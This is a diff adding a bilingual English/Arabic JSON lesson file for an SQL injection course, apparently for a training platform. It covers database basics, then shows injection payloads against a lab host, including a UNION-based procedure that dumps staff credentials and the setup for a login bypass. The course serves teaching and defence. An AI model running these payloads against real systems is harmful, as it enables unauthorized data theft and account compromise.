@@ -1,0 +1,1098 @@
+{
+  "landingData": {
+    "title": {
+      "en": "SQL Injection",
+      "ar": "حقن قواعد البيانات (SQLi)"
+    },
+    "description": {
+      "en": "Master the art of exploiting and defending against SQL injection vulnerabilities. Learn how attackers manipulate databases and how to write secure queries.",
+      "ar": "أتقن فن استغلال وحماية تطبيقات الويب من ثغرات حقن قواعد البيانات. تعلم كيف يتلاعب المهاجمون بالبيانات وكيفية كتابة استعلامات آمنة."
+    },
+    "difficulty": {
+      "en": "Advanced",
+      "ar": "متقدم"
+    },
+    "duration": {
+      "en": "45 min",
+      "ar": "45 دقيقة"
+    },
+    "instructor": "CyberLab",
+    "rating": "4.9",
+    "students": "3120",
+    "labsLink": "/BL-Vuln/BL_Vuln_labs"
+  },
+  "topics": [
+    {
+      "id": "intro",
+      "title": {
+        "en": "Introduction to SQL Injection",
+        "ar": "مقدمة إلى حقن SQL"
+      },
+      "elements": [
+        {
+          "type": "text",
+          "value": {
+            "en": "SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed. When a web application communicates with a database using input from a user that hasn't been properly validated, there runs the potential of an attacker being able to steal, delete or alter private and customer data and also attack the web application authentication methods to private or customer areas. This is why SQLi is one of the oldest web application vulnerabilities, and it can also be the most damaging.",
+            "ar": "حقن SQL (Structured Query Language Injection)، والذي يُشار إليه عادةً بـ SQLi، هو هجوم على خادم قاعدة بيانات تطبيق ويب يتسبب في تنفيذ استعلامات ضارة. عندما يتواصل تطبيق ويب مع قاعدة بيانات باستخدام مدخلات من مستخدم لم يتم التحقق منها بشكل صحيح، تظهر إمكانية قيام المهاجم بسرقة أو حذف أو تعديل البيانات الخاصة وبيانات العملاء بالإضافة إلى مهاجمة طرق المصادقة الخاصة بتطبيق الويب للوصول إلى المناطق الخاصة. لهذا السبب يُعتبر SQLi من أقدم ثغرات تطبيقات الويب وأيضاً من أكثرها ضرراً."
+          }
+        },
+        {
+          "type": "note",
+          "noteType": "info",
+          "value": {
+            "en": "In this course, you'll learn what databases are, what SQL is with some basic SQL commands, how to detect SQL vulnerabilities, how to exploit SQLi vulnerabilities and, as a developer, how you can protect yourself against SQL Injection.",
+            "ar": "في هذا الكورس، ستتعلم ما هي قواعد البيانات، وما هي لغة SQL مع بعض الأوامر الأساسية، وكيفية اكتشاف ثغرات SQL، وكيفية استغلال ثغرات SQLi، وكمطور، كيف يمكنك حماية نفسك من حقن SQL."
+          }
+        }
+      ]
+    },
+    {
+      "id": "topic_1",
+      "title": {
+        "en": "What is a Database?",
+        "ar": "ما هي قاعدة البيانات؟"
+      },
+      "elements": [
+        {
+          "type": "text",
+          "value": {
+            "en": "If you're not used to working with databases or exploiting them, there's probably some new terminology to get used to, so let's start with some basics on how databases are structured and how they work.",
+            "ar": "إذا لم تكن معتاداً على العمل مع قواعد البيانات أو استغلالها، فمن المحتمل أن تكون هناك بعض المصطلحات الجديدة التي يجب التعود عليها، لذا لنبدأ ببعض الأساسيات حول كيفية تنظيم قواعد البيانات وكيفية عملها."
+          }
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "What is a database?",
+            "ar": "ما هي قاعدة البيانات؟"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "A database is a way of electronically storing collections of data in an organised manner. A database is controlled by a DBMS, which is an acronym for Database Management System. DBMSs fall into two camps: Relational and Non-Relational; the focus of this room will be on Relational databases; some common ones you'll come across are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite. We'll explain the difference between Relational and Non-Relational databases at the end of this Topic, but first, it's important to learn a few terms.",
+            "ar": "قاعدة البيانات هي طريقة لتخزين مجموعات من البيانات إلكترونياً بطريقة منظمة. يتم التحكم في قاعدة البيانات بواسطة DBMS، وهو اختصار لنظام إدارة قواعد البيانات (Database Management System). تنقسم أنظمة DBMS إلى معسكرين: علائقية وغير علائقية؛ سيكون تركيز هذا الموضوع على قواعد البيانات العلائقية؛ بعض الأنواع الشائعة التي ستصادفها هي MySQL وMicrosoft SQL Server وAccess وPostgreSQL وSQLite. سنشرح الفرق بين قواعد البيانات العلائقية وغير العلائقية في نهاية هذا الموضوع، ولكن أولاً، من المهم تعلم بعض المصطلحات."
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Within a DBMS, you can have multiple databases, each containing its own set of related data. For example, you may have a database called \"shop\". Within this database, you want to store information about products available to purchase, users who have signed up to your online shop, and information about the orders you've received. You'd store this information separately in the database using something called tables. The tables are identified with a unique name for each one. You can see this structure in the diagram below, but you can also see how a business might have other separate databases to store staff information or the accounts team.",
+            "ar": "ضمن نظام DBMS، يمكن أن يكون لديك عدة قواعد بيانات، تحتوي كل منها على مجموعتها الخاصة من البيانات ذات الصلة. على سبيل المثال، قد يكون لديك قاعدة بيانات تسمى \"shop\". داخل قاعدة البيانات هذه، تريد تخزين معلومات حول المنتجات المتاحة للشراء، والمستخدمين الذين سجلوا في متجرك الإلكتروني، ومعلومات حول الطلبات التي تلقيتها. ستقوم بتخزين هذه المعلومات بشكل منفصل في قاعدة البيانات باستخدام شيء يسمى الجداول. يتم تحديد الجداول باسم فريد لكل منها."
+          }
+        },
+        {
+          "type": "image",
+          "srcKey": "DBServer",
+          "size": "medium",
+          "caption": {
+            "en": "Database Management System Structure showing multiple databases",
+            "ar": "هيكل نظام إدارة قواعد البيانات يوضح قواعد بيانات متعددة"
+          }
+        },
+        {
+          "type": "hr"
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "What are tables?",
+            "ar": "ما هي الجداول؟"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "A table is made up of columns and rows; a useful way to imagine a table is like a grid with the columns going across the top from left to right containing the name of the cell and the rows going from top to bottom, with each one having the actual data.",
+            "ar": "يتكون الجدول من أعمدة وصفوف؛ طريقة مفيدة لتخيل الجدول هي مثل شبكة مع أعمدة تمتد عبر الجزء العلوي من اليسار إلى اليمين تحتوي على اسم الخلية والصفوف تمتد من الأعلى إلى الأسفل، حيث تحتوي كل واحدة على البيانات الفعلية."
+          }
+        },
+        {
+          "type": "image",
+          "srcKey": "table",
+          "size": "medium",
+          "caption": {
+            "en": "Example of database table with columns and rows",
+            "ar": "مثال على جدول قاعدة البيانات بأعمدة وصفوف"
+          }
+        },
+        {
+          "type": "hr"
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "Columns",
+            "ar": "الأعمدة"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Each column, better referred to as a field, has a unique name per table. When creating a column, you also set the type of data it will contain, common ones being integers (numbers), strings (standard text) or dates. Some databases can contain much more complex data, such as geospatial, which contains location information. Setting the data type also ensures that incorrect information isn't stored, such as the string \"hello world\" being stored in a column meant for dates. If this happens, the database server will usually produce an error message. A column containing an integer can also have an auto-increment feature enabled; this gives each row of data a unique number that grows (increments) with each subsequent row. Doing so creates what is called a key field; a key field has to be unique for every row of data, which can be used to find that exact row in SQL queries.",
+            "ar": "كل عمود، يُشار إليه بشكل أفضل كحقل، له اسم فريد لكل جدول. عند إنشاء عمود، تقوم أيضاً بتحديد نوع البيانات التي سيحتوي عليها، الأنواع الشائعة هي الأعداد الصحيحة (integers)، والسلاسل النصية (strings)، أو التواريخ. يمكن لبعض قواعد البيانات أن تحتوي على بيانات أكثر تعقيداً، مثل البيانات الجغرافية المكانية، التي تحتوي على معلومات الموقع."
+          }
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "Rows",
+            "ar": "الصفوف"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Rows or records contain individual lines of data. When you add data to the table, a new row/record is created; when you delete data, a row/record is removed.",
+            "ar": "تحتوي الصفوف أو السجلات على سطور فردية من البيانات. عند إضافة بيانات إلى الجدول، يتم إنشاء صف/سجل جديد؛ عند حذف البيانات، تتم إزالة صف/سجل."
+          }
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "Relational Vs Non-Relational Databases",
+            "ar": "قواعد البيانات العلائقية مقابل قواعد البيانات غير العلائقية"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "A relational database stores information in tables, and often, the tables share information between them; they use columns to specify and define the data being stored and rows actually to store the data. The tables will often contain a column that has a unique ID (primary key), which will then be used in other tables to reference it and cause a relationship between the tables, hence the name relational database.",
+            "ar": "تخزن قاعدة البيانات العلائقية المعلومات في جداول، وغالباً ما تشارك الجداول المعلومات فيما بينها؛ تستخدم الأعمدة لتحديد وتعريف البيانات المخزنة والصفوف لتخزين البيانات فعلياً. غالباً ما تحتوي الجداول على عمود يحتوي على معرّف فريد (المفتاح الأساسي)، والذي سيتم استخدامه بعد ذلك في جداول أخرى للإشارة إليه وإنشاء علاقة بين الجداول، ومن هنا جاء اسم قاعدة البيانات العلائقية."
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Non-relational databases, sometimes called NoSQL, on the other hand, are any sort of database that doesn't use tables, columns and rows to store the data. A specific database layout doesn't need to be constructed so each row of data can contain different information, giving more flexibility over a relational database. Some popular databases of this type are MongoDB, Cassandra and ElasticSearch.",
+            "ar": "من ناحية أخرى، قواعد البيانات غير العلائقية، التي تسمى أحياناً NoSQL، هي أي نوع من قواعد البيانات التي لا تستخدم الجداول والأعمدة والصفوف لتخزين البيانات. لا حاجة لإنشاء تخطيط محدد لقاعدة البيانات بحيث يمكن لكل صف من البيانات أن يحتوي على معلومات مختلفة، مما يوفر مرونة أكبر من قاعدة البيانات العلائقية. بعض قواعد البيانات الشائعة من هذا النوع هي MongoDB وCassandra وElasticSearch."
+          }
+        }
+      ]
+    },
+    {
+      "id": "topic_2",
+      "title": {
+        "en": "What is SQL?",
+        "ar": "ما هي لغة SQL؟"
+      },
+      "elements": [
+        {
+          "type": "text",
+          "value": {
+            "en": "SQL (Structured Query Language) is a feature-rich language used for querying databases. These SQL queries are better referred to as statements.",
+            "ar": "SQL (لغة الاستعلام الهيكلية) هي لغة غنية بالميزات تُستخدم للاستعلام عن قواعد البيانات. يُشار إلى استعلامات SQL بشكل أفضل على أنها عبارات (statements)."
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "The simplest of the commands which we'll cover in this Topic is used to retrieve (select), update, insert and delete data. Although somewhat similar, some database servers have their own syntax and slight changes to how things work. All of these examples are based on a MySQL database. After learning the lessons, you'll easily be able to search for alternative syntax online for the different servers. It's worth noting that SQL syntax is not case-sensitive.",
+            "ar": "أبسط الأوامر التي سنغطيها في هذا الموضوع تُستخدم لاسترجاع (select) وتحديث وإدراج وحذف البيانات. على الرغم من التشابه إلى حد ما، فإن بعض خوادم قواعد البيانات لديها بناء الجملة الخاص بها وتغييرات طفيفة في كيفية عمل الأشياء. تستند جميع هذه الأمثلة إلى قاعدة بيانات MySQL. بعد تعلم الدروس، ستتمكن بسهولة من البحث عن بناء جملة بديل عبر الإنترنت للخوادم المختلفة. تجدر الإشارة إلى أن بناء جملة SQL ليس حساساً لحالة الأحرف."
+          }
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "SELECT Statement",
+            "ar": "جملة SELECT"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "The first query type we'll learn is the SELECT query used to retrieve data from the database.",
+            "ar": "أول نوع استعلام سنتعلمه هو استعلام SELECT المستخدم لاسترجاع البيانات من قاعدة البيانات."
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "select * from users;"
+        },
+        {
+          "type": "table",
+          "headers": {
+            "en": ["ID", "Username", "Password"],
+            "ar": ["المعرّف", "اسم المستخدم", "كلمة المرور"]
+          },
+          "rows": [
+            {
+              "en": ["1", "jon", "pass123"],
+              "ar": ["1", "jon", "pass123"]
+            },
+            {
+              "en": ["2", "admin", "p4ssword"],
+              "ar": ["2", "admin", "p4ssword"]
+            },
+            {
+              "en": ["3", "martin", "secret123"],
+              "ar": ["3", "martin", "secret123"]
+            }
+          ]
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "The first word SELECT, tells the database we want to retrieve some data; the * tells the database we want to receive back all columns from the table. For example, the table may contain three columns (id, username and password). \"from users\" tells the database we want to retrieve the data from the table named users. Finally, the semicolon at the end tells the database that this is the end of the query.",
+            "ar": "الكلمة الأولى SELECT، تخبر قاعدة البيانات أننا نريد استرجاع بعض البيانات؛ الرمز * يخبر قاعدة البيانات أننا نريد استرجاع جميع الأعمدة من الجدول. على سبيل المثال، قد يحتوي الجدول على ثلاثة أعمدة (id، username، password). \"from users\" يخبر قاعدة البيانات أننا نريد استرجاع البيانات من الجدول المسمى users. أخيراً، الفاصلة المنقوطة في النهاية تخبر قاعدة البيانات أن هذه هي نهاية الاستعلام."
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "select username,password from users;"
+        },
+        {
+          "type": "table",
+          "headers": {
+            "en": ["Username", "Password"],
+            "ar": ["اسم المستخدم", "كلمة المرور"]
+          },
+          "rows": [
+            {
+              "en": ["jon", "pass123"],
+              "ar": ["jon", "pass123"]
+            },
+            {
+              "en": ["admin", "p4ssword"],
+              "ar": ["admin", "p4ssword"]
+            },
+            {
+              "en": ["martin", "secret123"],
+              "ar": ["martin", "secret123"]
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "select * from users LIMIT 1;"
+        },
+        {
+          "type": "table",
+          "headers": {
+            "en": ["ID", "Username", "Password"],
+            "ar": ["المعرّف", "اسم المستخدم", "كلمة المرور"]
+          },
+          "rows": [
+            {
+              "en": ["1", "jon", "pass123"],
+              "ar": ["1", "jon", "pass123"]
+            }
+          ]
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "The following query, like the first, returns all the columns by using the * selector, and then the \"LIMIT 1\" clause forces the database to return only one row of data. Changing the query to \"LIMIT 1,1\" forces the query to skip the first result, and then \"LIMIT 2,1\" skips the first two results, and so on. You need to remember the first number tells the database how many results you wish to skip, and the second number tells the database how many rows to return.",
+            "ar": "الاستعلام التالي، مثل الأول، يُرجع جميع الأعمدة باستخدام محدد *، ثم يجبر عبارة \"LIMIT 1\" قاعدة البيانات على إرجاع صف واحد فقط من البيانات. تغيير الاستعلام إلى \"LIMIT 1,1\" يجبر الاستعلام على تخطي النتيجة الأولى، ثم \"LIMIT 2,1\" يتخطى أول نتيجتين، وهكذا. يجب أن تتذكر أن الرقم الأول يخبر قاعدة البيانات بعدد النتائج التي ترغب في تخطيها، والرقم الثاني يخبر قاعدة البيانات بعدد الصفوف المراد إرجاعها."
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "select * from users where username='admin';"
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "select * from users where username != 'admin';"
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "select * from users where username='admin' or username='jon';"
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "select * from users where username like 'a%';"
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Using the like clause allows you to specify data that isn't an exact match but instead either starts, contains or ends with certain characters by choosing where to place the wildcard character represented by a percentage sign %.",
+            "ar": "استخدام عبارة like يسمح لك بتحديد البيانات التي ليست مطابقة تماماً ولكن بدلاً من ذلك إما تبدأ أو تحتوي أو تنتهي بأحرف معينة عن طريق اختيار مكان وضع حرف البدل الممثل بعلامة النسبة المئوية %."
+          }
+        },
+        {
+          "type": "hr"
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "UNION Statement",
+            "ar": "جملة UNION"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type, and the column order has to be the same.",
+            "ar": "تجمع عبارة UNION نتائج عبارتي SELECT أو أكثر لاسترجاع البيانات من جدول واحد أو عدة جداول؛ القواعد لهذا الاستعلام هي أن عبارة UNION يجب أن تسترجع نفس عدد الأعمدة في كل عبارة SELECT، ويجب أن تكون الأعمدة من نوع بيانات مماثل، ويجب أن يكون ترتيب الأعمدة هو نفسه."
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;"
+        },
+        {
+          "type": "hr"
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "INSERT Statement",
+            "ar": "جملة INSERT"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "The INSERT statement tells the database we wish to insert a new row of data into the table.",
+            "ar": "تخبر عبارة INSERT قاعدة البيانات أننا نرغب في إدراج صف جديد من البيانات في الجدول."
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "insert into users (username,password) values ('bob','password123');"
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "UPDATE Statement",
+            "ar": "جملة UPDATE"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "The UPDATE statement tells the database we wish to update one or more rows of data within a table.",
+            "ar": "تخبر عبارة UPDATE قاعدة البيانات أننا نرغب في تحديث صف واحد أو أكثر من البيانات داخل الجدول."
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "update users SET username='root',password='pass123' where username='admin';"
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "DELETE Statement",
+            "ar": "جملة DELETE"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "The DELETE statement tells the database we wish to delete one or more rows of data.",
+            "ar": "تخبر عبارة DELETE قاعدة البيانات أننا نرغب في حذف صف واحد أو أكثر من البيانات."
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "delete from users where username='martin';"
+        }
+      ]
+    },
+    {
+      "id": "topic_3",
+      "title": {
+        "en": "What is SQL Injection?",
+        "ar": "ما هو حقن SQL؟"
+      },
+      "elements": [
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "What is SQL Injection?",
+            "ar": "ما هو حقن SQL؟"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.",
+            "ar": "النقطة التي يمكن أن يتحول فيها تطبيق ويب يستخدم SQL إلى حقن SQL هي عندما يتم تضمين البيانات المقدمة من المستخدم في استعلام SQL."
+          }
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "What does it look like?",
+            "ar": "كيف يبدو؟"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Take the following scenario where you've come across an online blog, and each blog entry has a unique ID number. The blog entries may be either set to public or private, depending on whether they're ready for public release. The URL for each blog entry may look something like this:",
+            "ar": "خذ السيناريو التالي حيث صادفت مدونة إلكترونية، وكل مدخل في المدونة له رقم معرّف فريد. قد يتم تعيين إدخالات المدونة إما على أنها عامة أو خاصة، اعتماداً على ما إذا كانت جاهزة للنشر العام. قد يبدو عنوان URL لكل إدخال في المدونة كما يلي:"
+          }
+        },
+        {
+          "type": "terminal",
+          "label": {
+            "en": "URL Example",
+            "ar": "مثال على URL"
+          },
+          "value": "https://website.thm/blog?id=1"
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "From the URL above, you can see that the blog entry selected comes from the id parameter in the query string. The web application needs to retrieve the article from the database and may use an SQL statement that looks something like the following:",
+            "ar": "من عنوان URL أعلاه، يمكنك أن ترى أن إدخال المدونة المحدد يأتي من معامل id في سلسلة الاستعلام. يحتاج تطبيق الويب إلى استرجاع المقالة من قاعدة البيانات وقد يستخدم عبارة SQL تبدو كما يلي:"
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "SELECT * from blog where id=1 and private=0 LIMIT 1;"
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "As was mentioned at the start of this Topic, SQL Injection is introduced when user input is introduced into the database query. In this instance, the id parameter from the query string is used directly in the SQL query.",
+            "ar": "كما ذُكر في بداية هذا الموضوع، يتم إدخال حقن SQL عندما يتم إدخال مدخلات المستخدم في استعلام قاعدة البيانات. في هذه الحالة، يتم استخدام معامل id من سلسلة الاستعلام مباشرة في استعلام SQL."
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Let's pretend article ID 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:",
+            "ar": "لنتظاهر أن المقالة ذات المعرّف 2 لا تزال مقفلة كخاصة، لذلك لا يمكن عرضها على الموقع. يمكننا الآن بدلاً من ذلك استدعاء عنوان URL:"
+          }
+        },
+        {
+          "type": "terminal",
+          "label": {
+            "en": "Injection Payload",
+            "ar": "حمولة الحقن"
+          },
+          "value": "https://website.thm/blog?id=2;--"
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Which would then, in turn, produce the SQL statement:",
+            "ar": "والذي سينتج بدوره عبارة SQL:"
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "SELECT * from blog where id=2;-- and private=0 LIMIT 1"
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the query:",
+            "ar": "الفاصلة المنقوطة في عنوان URL تشير إلى نهاية عبارة SQL، والشرطتان تتسببان في معاملة كل شيء بعد ذلك كتعليق. من خلال القيام بذلك، فأنت في الواقع تقوم فقط بتشغيل الاستعلام:"
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "SELECT * from blog where id=2;--"
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Which will return the article with an ID of 2 whether it is set to public or not.",
+            "ar": "والذي سيُرجع المقالة ذات المعرّف 2 سواء تم تعيينها على أنها عامة أم لا."
+          }
+        },
+        {
+          "type": "note",
+          "noteType": "warning",
+          "value": {
+            "en": "This is a basic example of how SQL injection works by manipulating user input to alter the intended SQL query behavior.",
+            "ar": "هذا مثال أساسي على كيفية عمل حقن SQL من خلال التلاعب بمدخلات المستخدم لتغيير سلوك استعلام SQL المقصود."
+          }
+        }
+      ]
+    },
+    {
+      "id": "topic_4",
+      "title": {
+        "en": "In-Band SQLi",
+        "ar": "حقن SQL المباشر"
+      },
+      "elements": [
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "In-Band SQL Injection",
+            "ar": "حقن SQL المباشر"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.",
+            "ar": "حقن SQL المباشر هو أسهل نوع للكشف والاستغلال؛ يشير In-Band ببساطة إلى نفس طريقة الاتصال المستخدمة لاستغلال الثغرة وأيضاً تلقي النتائج، على سبيل المثال، اكتشاف ثغرة حقن SQL على صفحة موقع ويب ثم القدرة على استخراج البيانات من قاعدة البيانات إلى نفس الصفحة."
+          }
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "Error-Based SQL Injection",
+            "ar": "حقن SQL القائم على الأخطاء"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "This type of SQL Injection is the most useful for easily obtaining information about the database structure, as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database.",
+            "ar": "هذا النوع من حقن SQL هو الأكثر فائدة للحصول بسهولة على معلومات حول بنية قاعدة البيانات، حيث يتم طباعة رسائل الخطأ من قاعدة البيانات مباشرة على شاشة المتصفح. يمكن استخدام هذا في كثير من الأحيان لتعداد قاعدة بيانات كاملة."
+          }
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "Union-Based SQL Injection",
+            "ar": "حقن SQL القائم على UNION"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.",
+            "ar": "يستخدم هذا النوع من الحقن عامل SQL UNION جنباً إلى جنب مع عبارة SELECT لإرجاع نتائج إضافية إلى الصفحة. هذه الطريقة هي الطريقة الأكثر شيوعاً لاستخراج كميات كبيرة من البيانات عبر ثغرة حقن SQL."
+          }
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "Practical Example",
+            "ar": "مثال عملي"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( \" ).",
+            "ar": "المفتاح لاكتشاف حقن SQL القائم على الأخطاء هو كسر استعلام SQL الخاص بالكود عن طريق تجربة أحرف معينة حتى يتم إنتاج رسالة خطأ؛ الأكثر شيوعاً هي الفاصلة العليا المفردة ( ' ) أو علامة الاقتباس ( \" )."
+          }
+        },
+        {
+          "type": "list",
+          "title": {
+            "en": "Step-by-step exploitation process:",
+            "ar": "عملية الاستغلال خطوة بخطوة:"
+          },
+          "items": {
+            "en": [
+              "Try adding UNION SELECT 1 - this will produce an error about column count mismatch",
+              "Keep adding columns: UNION SELECT 1,2 then UNION SELECT 1,2,3 until error disappears",
+              "Change the ID to 0 to make original query return no results: 0 UNION SELECT 1,2,3",
+              "Extract database name: 0 UNION SELECT 1,2,database()",
+              "Enumerate tables: 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'",
+              "Find column names: 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'",
+              "Extract data: 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users"
+            ],
+            "ar": [
+              "حاول إضافة UNION SELECT 1 - سينتج هذا خطأ حول عدم تطابق عدد الأعمدة",
+              "استمر في إضافة الأعمدة: UNION SELECT 1,2 ثم UNION SELECT 1,2,3 حتى يختفي الخطأ",
+              "غيّر المعرّف إلى 0 لجعل الاستعلام الأصلي لا يُرجع نتائج: 0 UNION SELECT 1,2,3",
+              "استخرج اسم قاعدة البيانات: 0 UNION SELECT 1,2,database()",
+              "عدّد الجداول: 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'",
+              "ابحث عن أسماء الأعمدة: 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'",
+              "استخرج البيانات: 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users"
+            ]
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users"
+        }
+      ]
+    },
+    {
+      "id": "topic_5",
+      "title": {
+        "en": "Blind SQLi - Authentication Bypass",
+        "ar": "حقن SQL الأعمى - تجاوز المصادقة"
+      },
+      "elements": [
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "Blind SQLi",
+            "ar": "حقن SQL الأعمى"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successfully enumerate a whole database.",
+            "ar": "على عكس حقن SQL المباشر، حيث يمكننا رؤية نتائج هجومنا مباشرة على الشاشة، فإن حقن SQL الأعمى هو عندما نحصل على قليل أو لا شيء من التغذية الراجعة لتأكيد ما إذا كانت استعلاماتنا المحقونة ناجحة بالفعل أم لا، وذلك لأن رسائل الخطأ تم تعطيلها، لكن الحقن لا يزال يعمل على أي حال. قد يفاجئك أن كل ما نحتاجه هو تلك القليل من التغذية الراجعة لتعداد قاعدة بيانات كاملة بنجاح."
+          }
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "Authentication Bypass",
+            "ar": "تجاوز المصادقة"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login.",
+            "ar": "واحدة من أبسط تقنيات حقن SQL الأعمى هي عند تجاوز طرق المصادقة مثل نماذج تسجيل الدخول. في هذه الحالة، لسنا مهتمين كثيراً باسترجاع البيانات من قاعدة البيانات؛ نريد فقط تجاوز تسجيل الدخول."
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more in whether the two make a matching pair in the users table. In basic terms, the web application is asking the database, \"Do you have a user with the username bob and the password bob123?\" the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not.",
+            "ar": "غالباً ما يتم تطوير نماذج تسجيل الدخول المتصلة بقاعدة بيانات المستخدمين بطريقة لا يكون فيها تطبيق الويب مهتماً بمحتوى اسم المستخدم وكلمة المرور ولكن أكثر في ما إذا كان الاثنان يشكلان زوجاً متطابقاً في جدول المستخدمين. بعبارات أساسية، يسأل تطبيق الويب قاعدة البيانات، \"هل لديك مستخدم باسم المستخدم bob وكلمة المرور bob123؟\" تجيب قاعدة البيانات بنعم أو لا (true/false) واعتماداً على تلك الإجابة، تحدد ما إذا كان تطبيق الويب يسمح لك بالمتابعة أم لا."
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "select * from users where username='%username%' and password='%password%' LIMIT 1;"
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "To make this into a query that always returns as true, we can enter the following into the password field:",
+            "ar": "لجعل هذا استعلاماً يُرجع دائماً true، يمكننا إدخال ما يلي في حقل كلمة المرور:"
+          }
+        },
+        {
+          "type": "terminal",
+          "label": {
+            "en": "Bypass Payload",
+            "ar": "حمولة التجاوز"
+          },
